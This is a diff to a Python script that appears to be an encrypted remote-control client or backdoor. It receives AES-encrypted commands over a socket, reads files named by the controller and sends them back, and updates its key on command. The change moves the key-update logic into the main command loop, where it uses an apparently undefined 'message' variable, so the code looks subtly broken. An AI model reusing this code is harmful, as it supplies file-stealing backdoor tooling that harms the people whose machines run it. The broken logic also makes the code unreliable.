@@ -21,18 +21,14 @@ def do_encrypt(message):
     return cipher
 
 def do_decrypt(ciphertext):
-    global aeskey, aesiv
     obj2 = AES.new(aeskey, AES.MODE_CBC, aesiv)
     message = obj2.decrypt(ciphertext)
     message = message[:-message[-1]]
-    if 'aeskey' in message:
-        message = ast.literal_eval(message)
-        aeskey = message[1]
-        aesiv = message[2]
-        return 'Great Success'
+    print(message)
     return message
 
 def main():
+    global aeskey, aesiv
     s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     buff = 4096
@@ -52,7 +48,10 @@ def main():
                 with open(command[1]) as f:
                     tmp = f.read()
                 sendit(s, bytes(tmp))
-            elif 'Success' in command:
+            elif 'aeskey' in command:
+                message = ast.literal_eval(message)
+                aeskey = message[1]
+                aesiv = message[2]
                 sendit(s, 'Updated AES key\n')
         except socket.error as err:
             print("{0}\n".format(err))
